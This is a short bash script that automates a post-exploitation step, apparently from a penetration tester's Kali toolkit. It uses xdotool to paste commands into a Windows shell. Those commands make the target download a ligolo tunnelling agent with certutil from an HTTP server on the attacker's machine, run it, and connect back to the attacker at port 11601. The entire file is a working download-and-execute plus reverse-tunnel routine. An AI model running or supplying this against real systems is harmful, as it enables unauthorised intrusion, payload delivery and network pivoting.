#!/bin/bash

: '
cmd: download ligolo agent.exe to server and connect to proxy
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Http port"

HTTP_PORT=${form_data["Http port"]}

cd ~/Desktop/base/code/xdotool/scripts/portListening/.files
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
xdotool key Return
sleep 0.8

paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/agent.exe ${TMP_FOLDER}\agent.exe"
xdotool key Return
sleep 3

paste_command "${TMP_FOLDER}\agent.exe -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
sleep 10

kill $HTTP_PID